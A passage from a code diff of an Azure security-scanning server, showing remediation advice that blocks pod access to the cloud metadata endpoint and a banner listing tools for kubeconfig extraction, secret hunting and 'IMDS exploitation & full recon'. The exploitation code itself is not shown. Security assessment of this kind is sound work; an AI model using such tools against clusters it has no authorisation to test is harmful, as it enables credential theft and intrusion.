+          output += `## 🛡️ Remediation Recommendations\n\n`;
+          output += `### Immediate Actions\n\n`;
+          output += `1. **Block IMDS Access** - Apply NetworkPolicy:\n`;
+          output += `\`\`\`yaml\n`;
+          output += `apiVersion: networking.k8s.io/v1\n`;
+          output += `kind: NetworkPolicy\n`;
+          output += `metadata:\n`;
+          output += `  name: deny-imds\n`;
+          output += `spec:\n`;
+          output += `  podSelector: {}\n`;
+          output += `  policyTypes: [Egress]\n`;
+          output += `  egress:\n`;
+          output += `  - to:\n`;
+          output += `    - ipBlock:\n`;
+          output += `        cidr: 0.0.0.0/0\n`;
+          output += `        except: [169.254.169.254/32]\n`;
+          output += `\`\`\`\n\n`;
+          
+          output += `2. **Enable Workload Identity** (Recommended):\n`;
+          output += `\`\`\`bash\n`;
+          output += `az aks update -g ${resourceGroup} -n ${clusterName} --enable-oidc-issuer --enable-workload-identity\n`;
+          output += `\`\`\`\n\n`;
+          
+          output += `3. **Reduce Kubelet Identity Permissions**:\n`;
+          output += `   - Review and reduce role assignments on kubelet managed identity\n`;
+          output += `   - Remove Contributor/Network Contributor if not needed\n\n`;
+          
+          output += `4. **Enable Pod Security Standards**:\n`;
+          output += `\`\`\`bash\n`;
+          output += `kubectl label namespace ${targetNamespace} pod-security.kubernetes.io/enforce=restricted\n`;
+          output += `\`\`\`\n\n`;
+
+          output += `---\n\n`;
+          output += `*Generated by Stratos MCP v1.10.0 - IMDS Exploitation & Full Reconnaissance*\n`;
+
+          // Cleanup
+          try {
+            await fsMod.unlink(tempKubeconfig);
+          } catch (cleanupErr) {}
+
+          return {
+            content: [{ type: 'text', text: output }],
+          };
+        } catch (error: any) {
+          return {
+            content: [{ type: 'text', text: `Error running IMDS recon: ${error.message}` }],
+            isError: true,
+          };
+        }
+      }
+
       default:
         throw new Error(`Unknown tool: ${request.params.name}`);
     }
@@ -7345,9 +8206,9 @@ async function main() {
   console.error("=".repeat(70));
   console.error("\n[OK] Server Status: Running");
   console.error("Transport: stdio");
-  console.error("Version: 1.9.1");
-  console.error("\nAvailable Tools (36):");
-  console.error("\n  Multi-Location Scanning (NEW!):");
+  console.error("Version: 1.10.0");
+  console.error("\nAvailable Tools (38):");
+  console.error("\n  Multi-Location Scanning:");
   console.error("   1. list_active_locations     - Discover active Azure regions");
   console.error("   2. scan_all_locations        - Scan resources across regions");
   console.error("\n  Core Enumeration:");
@@ -7365,21 +8226,22 @@ async function main() {
   console.error("   12. analyze_key_vault_security - Key Vault configuration audit");
   console.error("   13. analyze_cosmos_db_security - Cosmos DB exposure checker");
   console.error("   14. analyze_vm_security      - VM disk encryption & agents");
-  console.error("\n  AKS/Kubernetes Security (8 tools):");
-  console.error("   15. scan_aks_full            - 🚀 FULL AKS SCAN (all 7 checks in one!)");
+  console.error("\n  AKS/Kubernetes Security (9 tools):");
+  console.error("   15. scan_aks_full            - FULL AKS SCAN (all checks in one!)");
   console.error("   16. scan_aks_clusters        - AKS RBAC & network policies");
   console.error("   17. get_aks_credentials      - Extract kubeconfig & admin access");
   console.error("   18. enumerate_aks_identities - Map managed identities & RBAC");
   console.error("   19. scan_aks_node_security   - Node encryption & SSH analysis");
-  console.error("   20. test_aks_imds_access     - IMDS exploitation testing");
-  console.error("   21. scan_aks_service_accounts - Service account security");
-  console.error("   22. hunt_aks_secrets         - Secret hunting guide");
+  console.error("   20. scan_aks_service_accounts - Service account security");
+  console.error("   21. hunt_aks_secrets         - Secret hunting guide");
+  console.error("   22. scan_aks_live            - LIVE K8s API security scan (20 checks)");
+  console.error("   23. test_aks_imds_full_recon - IMDS exploitation & full recon (NEW!)");
   console.error("\n  DevOps & Reporting:");
-  console.error("   23. scan_azure_devops        - Azure DevOps security scanner");
-  console.error("   24. generate_security_report - PDF/HTML/CSV report export");
+  console.error("   24. scan_azure_devops        - Azure DevOps security scanner");
+  console.error("   25. generate_security_report - PDF/HTML/CSV report export");
   console.error("\n[TIP] Quick Start:");
-  console.error("   scan_aks_full subscriptionId='SUB' resourceGroup='RG' clusterName='CLUSTER'");
-  console.error("   list_active_locations subscriptionId='SUB' scanMode='all'");
+  console.error("   test_aks_imds_full_recon subscriptionId='SUB' resourceGroup='RG' clusterName='CLUSTER'");
+  console.error("   scan_aks_live subscriptionId='SUB' resourceGroup='RG' clusterName='CLUSTER'");
   console.error("\nAuthentication: Using Azure CLI credentials (az login)");
   console.error("=".repeat(70) + "\n");
 }
